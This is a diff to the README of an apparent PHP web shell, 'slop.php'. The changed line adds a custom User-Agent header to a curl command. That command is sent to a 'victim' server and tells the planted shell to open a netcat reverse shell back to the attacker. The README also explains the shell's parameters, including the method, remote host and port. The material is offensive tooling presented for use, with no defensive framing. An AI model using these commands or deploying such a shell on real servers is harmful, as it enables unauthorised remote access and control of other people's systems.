@@ -18,7 +18,7 @@ or to execute custom commands:
 
 Or to attempt to establish a reverse shell to your machine:
 
-`curl https://victim/slop.php --data "rcom=1&mthd=nc&rhost=&rport=&shell=sh" -v`
+`curl https://victim/slop.php --data "rcom=1&mthd=nc&rhost=&rport=&shell=sh" -H "User-Agent: sp/1.1" -v`
 
 - mthd = the method you want to use to establish the reverse shell, this is predefined in the `$comma` array, feel free to add to it, optional, if it is null, the script will choose for you.
 - rhost = you, now this and the rport are not required, as it defaults to using netcat with the ip address in the `$_SERVER["REMOTE_ADDR"]` php env variable.
